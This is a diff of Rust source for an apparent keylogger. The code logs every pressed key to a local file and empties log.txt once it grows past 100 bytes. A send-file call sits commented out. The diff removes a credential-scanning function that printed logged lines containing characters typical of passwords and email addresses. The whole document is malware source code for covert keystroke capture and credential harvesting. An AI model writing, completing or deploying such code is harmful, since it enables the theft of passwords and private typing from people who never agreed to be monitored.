@@ -8,7 +8,7 @@ use dotenv::dotenv;
 use std::{ env };
 use std::{thread, time};
 use std::fs;
-use regex::Regex;
+
 
 pub fn match_case(key: &Keycode) -> &'static str {
 
@@ -39,11 +39,6 @@ pub fn match_case(key: &Keycode) -> &'static str {
             "caps"
         }
 
-        Keycode::RShift | Keycode::Slash => {
-            // write to file
-            file.write(b"?").expect("Failed to write to file");
-            "?"
-        } 
         _ => { 
             write!(file, "{}",  key.to_string().to_lowercase()).expect("Failed to write to file");  
             "Other"
@@ -56,27 +51,12 @@ fn size_check(file: &mut std::fs::File) {
     let file_size = file.metadata().unwrap().len();
     
     if file_size > 100 {
-        let content = fs::read_to_string("log.txt").unwrap();
-
-        creds_check(content);
+        let _content = fs::read_to_string("log.txt").unwrap();
 
         println!("File is too big");
         // send_file(file);
         // empty file
         file.set_len(0).expect("Failed to empty file");
-    }
-}
-
-fn creds_check(content: String) {
-    let a = ["@", "$", "!", "?"];
-    
-    for line in content.lines() {
-        // check if line contains any of the above
-        for c in a.iter() {
-            if line.contains(c) {
-                println!("{}", line);
-            }
-        }
     }
 }
 
